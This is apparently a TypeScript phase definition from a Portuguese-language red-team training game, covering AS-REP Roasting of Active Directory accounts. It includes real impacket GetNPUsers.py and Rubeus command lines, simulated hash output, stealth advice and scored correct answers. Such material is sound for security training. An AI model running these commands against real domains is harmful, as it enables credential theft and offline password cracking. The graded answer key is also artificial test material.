import type { PhaseDefinition } from "./types";

export const phase05: PhaseDefinition = {
  number: 5,
  technicalName: "AS-REP Roasting",
  thematicName: "Captação de AS-REP em conta legada de planejamento",
  objective:
    "Solicitar o AS-REP da conta com pré-autenticação Kerberos desabilitada e exportar o hash para crack offline.",
  context: ds =>
    [
      `📭 Achado de ouro: a conta "${ds.asrepTarget.username}" arrasta a flag DONT_REQ_PREAUTH desde uma`,
      `   migração antiga de domínio. Tradução prática: o KDC entrega um AS-REP cifrado para quem pedir,`,
      `   sem exigir pré-autenticação.`,
      ``,
      `🎯 O AS-REP é cifrado com chave derivada da senha do alvo — você pega o blob e quebra offline,`,
      `   sem gerar 4625 (falha de logon) e sem acordar a equipe de identidade.`,
      ``,
      `⚠️ Cuidado: pedir AS-REP para a lista inteira do domínio é diferente de pedir para 1 alvo.`,
      `   Volume gera ruído. Antes de avançar, você precisará explicar por escrito por que escolheu sua técnica.`,
      ``,
      `💡 Há ferramentas da impacket para isso a partir do seu laptop, e equivalentes para host ingressado.`,
      `   Pense em qual fluxo gera menos pegada na sua condição atual.`
    ].join("\n"),
  expectedCommand: "GetNPUsers.py",
  acceptedCommands: ["Rubeus"],
  requiresJustification: true,
  options: [
    {
      id: "a",
      text: "GetNPUsers.py {dom}/ -usersfile users.txt -no-pass -format hashcat -dc-ip <DC-IP>",
      correct: true,
      response: ds =>
        [
          `[*] Getting TGT for ${ds.asrepTarget.username}`,
          `$krb5asrep$23$${ds.asrepTarget.username}@${ds.domain.toUpperCase()}:` +
            `${randSeg(ds.seed, "asrep-a")}$${randSeg(ds.seed, "asrep-b", 96)}`,
          ``,
          `[+] Hash AS-REP exportado em formato hashcat (modo 18200).`
        ].join("\n"),
      scoreDelta: 1.5,
      detectionDelta: 4,
      budgetDelta: -6,
      unlockEvidences: ds => [
        {
          label: "Hash AS-REP capturado",
          payload: {
            user: ds.asrepTarget.username,
            mode: "hashcat -m 18200",
            sample: `$krb5asrep$23$${ds.asrepTarget.username}@${ds.domain.toUpperCase()}:...`
          }
        }
      ],
      flag: ds => ds.flags.p5
    },
    {
      id: "b",
      text: "Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt",
      correct: true,
      alternativePath: true,
      response: ds =>
        [
          `[*] Action: AS-REP roasting`,
          `[*] Target Domain          : ${ds.domain.toUpperCase()}`,
          `[*] Users found            : 1`,
          `[*] SamAccountName         : ${ds.asrepTarget.username}`,
          `[*] Hash written to asrep.txt`,
          ``,
          `[+] Caminho alternativo via Rubeus — válido em hosts ingressados.`
        ].join("\n"),
      scoreDelta: 1.1,
      detectionDelta: 8,
      budgetDelta: -5,
      unlockEvidences: ds => [
        { label: "AS-REP via Rubeus", payload: { tool: "Rubeus", user: ds.asrepTarget.username } }
      ],
      flag: ds => ds.flags.p5
    },
    {
      id: "c",
      text: "GetNPUsers.py {dom}/ -all -request -dc-ip <DC-IP>",
      correct: false,
      response: () =>
        "Solicitar AS-REP para todos os usuários gera explosão de eventos 4768/4625 e dispara regras anti-spray.",
      scoreDelta: -0.5,
      detectionDelta: 20,
      budgetDelta: -6
    },
    {
      id: "d",
      text: "GetNPUsers.py {dom}/{user}:{pwd} -dc-ip <DC-IP>".replace("{user}", "<initial>").replace("{pwd}", "<senha>"),
      correct: false,
      response: () =>
        "Forçar autenticação com credencial inicial perde o ponto do AS-REP (que dispensa pré-auth) e marca a sessão.",
      scoreDelta: -0.3,
      detectionDelta: 6,
      budgetDelta: -5
    },
    {
      id: "e",
      text: "GetNPUsers.py {dom}/ -usersfile /dev/null -no-pass",
      correct: false,
      response: () => "Lista vazia: nenhum hash retornado. Apenas consumo de orçamento.",
      scoreDelta: -0.3,
      detectionDelta: 2,
      budgetDelta: -5
    }
  ],
  techExplanation:
    "AS-REP Roasting requer apenas o nome de uma conta com DONT_REQ_PREAUTH. O servidor entrega o AS-REP cifrado com chave derivada da senha, permitindo crack offline (hashcat -m 18200)."
};

function randSeg(seed: string, salt: string, len = 32): string {
  let h = 0;
  const s = seed + ":" + salt;
  for (let i = 0; i < s.length; i++) h = (h * 31 + s.charCodeAt(i)) | 0;
  const chars = "abcdef0123456789";
  let out = "";
  for (let i = 0; i < len; i++) {
    h = (h * 1103515245 + 12345) | 0;
    out += chars[Math.abs(h) % chars.length];
  }
  return out;
}
